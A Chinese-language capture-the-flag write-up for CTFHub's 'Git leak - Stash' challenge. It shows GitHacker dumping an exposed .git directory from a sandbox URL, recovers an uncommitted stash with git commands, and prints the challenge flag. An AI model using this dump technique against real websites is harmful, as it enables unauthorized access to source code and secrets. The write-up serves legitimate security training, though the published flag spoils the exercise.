---
title: CTFHub-信息泄露-Git泄露-Stash Writeup
date: 2026-09-24
category: Web
tags: [CTFHub, 信息泄露， Git泄露]
---
## 题目简介
考点：Git泄露之Stash贮藏
原理：开发者使用`git stash`临时保存工作区修改，**没有执行commit提交**，内容存入Git贮藏栈。`git log`查看不到贮藏中的内容，若网站`.git`目录泄露，攻击者可以下载仓库并读取stash贮藏的文件，获取flag。

## 环境与工具
- 系统：Windows
- 工具：GitHacker、Git
- 语言：Python

## 工具安装
pip install GitHacker

## 解题步骤
1.使用githacker下载泄露的.git仓库
githacker --url http://challenge-b885682dea1eff35.sandbox.ctfhub.com:10800/.git/ --output-folder git_result
2.查看下载目录，进入仓库文件夹
dir git_result
cd git_rusult\1b4771342f65ca18c7b595b3d50d3d0b
3.查看stash贮藏列表
git stash list
显示WIP on master: b907c1b add flag
存在贮藏内容
4.取出stash贮藏内容
git stash pop
5.查看当前目录文件，发现txt格式flag文件，读取文件内容
dir
type 14803486124694.txt
成功读取flag

## Flag
ctfhub{7e6ec9d20db078a65677eaf3}

## 知识点总结
1. git stash：临时保存工作区未提交的修改，不产生commit记录
2. git stash list：列出所有贮藏记录
3. git stash pop：取出最近一条贮藏内容，取出后该贮藏记录会被删除
4. git stash show -p：直接查看贮藏内容，不会释放文件、不会产生冲突
